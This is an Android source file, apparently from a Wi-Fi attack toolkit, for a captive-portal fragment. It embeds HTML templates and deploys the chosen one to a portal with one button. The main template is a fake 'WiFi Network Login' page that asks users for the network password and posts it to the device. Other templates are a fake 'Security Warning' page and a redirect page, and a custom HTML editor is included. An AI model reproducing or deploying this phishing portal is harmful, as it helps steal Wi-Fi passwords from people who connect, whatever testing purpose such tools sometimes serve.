package com.opx.yourdemon.captive_portal_web;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.fragment.app.Fragment;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.textfield.TextInputEditText;
import com.opx.yourdemon.R;
import com.opx.yourdemon.captive_portal_web.utils.PortalDeployer;
import com.opx.yourdemon.utils.Core;
import com.opx.yourdemon.utils.OnSwipeListener;
import com.opx.yourdemon.utils.TaskRunner;

import net.cachapa.expandablelayout.ExpandableLayout;

public class PortalWebFragment extends Fragment {

    private static final String LOGIN_TEMPLATE = "<html><head><title>WiFi Login</title><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:12px;padding:40px;width:90%;max-width:400px;box-shadow:0 15px 35px rgba(0,0,0,0.3);text-align:center}h2{color:#333;margin-bottom:8px}p{color:#777;margin-bottom:20px;font-size:14px}input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;outline:none;transition:border .3s}input:focus{border-color:#667eea}button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold;margin-top:8px}button:hover{opacity:0.9}.error{color:#e74c3c;font-size:13px;margin-top:8px;display:none}</style></head><body><div class='card'><h2>WiFi Network Login</h2><p>Enter the password to connect to this network</p><form method='POST' action='/login'><input type='password' name='password' placeholder='Enter WiFi Password' required><button type='submit'>Connect</button></form></div></body></html>";
    private static final String WARNING_TEMPLATE = "<html><head><title>Security Warning</title><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#16213e;border-radius:12px;padding:40px;width:90%;max-width:420px;box-shadow:0 15px 35px rgba(0,0,0,0.5);text-align:center;border:1px solid #e94560}.icon{font-size:64px;margin-bottom:10px}h2{color:#e94560;margin-bottom:8px}p{color:#ccc;margin-bottom:16px;font-size:14px;line-height:1.5}.warn-box{background:rgba(233,69,96,0.1);border-left:4px solid #e94560;padding:12px;margin:16px 0;text-align:left;border-radius:4px;color:#aaa;font-size:13px}button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold}button:hover{opacity:0.9}</style></head><body><div class='card'><div class='icon'>&#9888;</div><h2>Security Warning</h2><p>This network is monitored and secured. Unauthorized access is prohibited and may result in legal action.</p><div class='warn-box'>All connection attempts are logged. By continuing you accept these terms and acknowledge that your activity may be recorded.</div><form method='POST' action='/acknowledge'><button type='submit'>I Understand</button></form></div></body></html>";
    private static final String REDIRECT_TEMPLATE = "<html><head><title>Redirecting...</title><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='refresh' content='3;url=https://example.com'><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:12px;padding:40px;width:90%;max-width:400px;box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center}.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h2{color:#333;margin-bottom:8px}p{color:#777;font-size:14px}a{color:#3498db;text-decoration:none;font-size:13px}a:hover{text-decoration:underline}</style></head><body><div class='card'><div class='spinner'></div><h2>Redirecting...</h2><p>You are being redirected to the requested page.</p><p style='margin-top:16px;font-size:13px'>If you are not redirected automatically, <a href='https://example.com'>click here</a>.</p></div></body></html>";

    public Core core;
    public Context context;
    public Activity activity;
    public MaterialButton previewBtn, deployBtn;
    public Spinner templateSpinner;
    public TextView htmlPreview;
    public TextInputEditText customEditor;
    public View customEditorContainer;

    private String[] templateNames;
    private String[] templateContents;
    private String currentHtml;

    public PortalWebFragment() {
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.portal_web_fragment, container, false);
        context = getContext();
        activity = getActivity();
        core = new Core(context);

        ExpandableLayout menu = activity.findViewById(R.id.menu_expand);
        view.setOnTouchListener(new OnSwipeListener(context) {
            public void onSwipeTop() { core.closemenu(menu); }
            @SuppressLint("ClickableViewAccessibility")
            public void onSwipeRight() { }
            public void onSwipeLeft() { }
            public void onSwipeBottom() { core.openmenu(menu); }
        });

        templateSpinner = view.findViewById(R.id.template_spinner);
        previewBtn = view.findViewById(R.id.preview_template);
        htmlPreview = view.findViewById(R.id.html_preview);
        customEditor = view.findViewById(R.id.custom_editor);
        customEditorContainer = view.findViewById(R.id.custom_editor_container);
        deployBtn = view.findViewById(R.id.deploy_portal);

        templateNames = new String[]{"Login Page", "Warning Page", "Redirect Page", "Custom"};
        templateContents = new String[]{LOGIN_TEMPLATE, WARNING_TEMPLATE, REDIRECT_TEMPLATE, ""};

        ArrayAdapter<String> adapter = new ArrayAdapter<>(context, android.R.layout.simple_spinner_item, templateNames);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        templateSpinner.setAdapter(adapter);

        currentHtml = LOGIN_TEMPLATE;

        templateSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                if (position == 3) {
                    customEditorContainer.setVisibility(View.VISIBLE);
                    currentHtml = customEditor.getText() != null ? customEditor.getText().toString() : "";
                } else {
                    customEditorContainer.setVisibility(View.GONE);
                    currentHtml = templateContents[position];
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });

        previewBtn.setOnClickListener(v -> {
            int pos = templateSpinner.getSelectedItemPosition();
            if (pos == 3) {
                currentHtml = customEditor.getText() != null ? customEditor.getText().toString() : "";
            } else {
                currentHtml = templateContents[pos];
            }
            htmlPreview.setText(currentHtml);
        });

        deployBtn.setOnClickListener(v -> {
            int pos = templateSpinner.getSelectedItemPosition();
            if (pos == 3) {
                currentHtml = customEditor.getText() != null ? customEditor.getText().toString() : "";
            } else {
                currentHtml = templateContents[pos];
            }
            if (currentHtml.isEmpty()) {
                core.toaster("HTML content is empty");
                return;
            }
            deployBtn.setEnabled(false);
            deployBtn.setText("Deploying...");
            TaskRunner.execute(() -> {
                Boolean success = PortalDeployer.execute(currentHtml);
                deployBtn.post(() -> {
                    deployBtn.setEnabled(true);
                    deployBtn.setText("Deploy to Portal");
                    if (success) {
                        core.toaster("Template deployed successfully");
                    } else {
                        core.toaster("Deploy failed");
                    }
                });
            });
        });

        return view;
    }
}
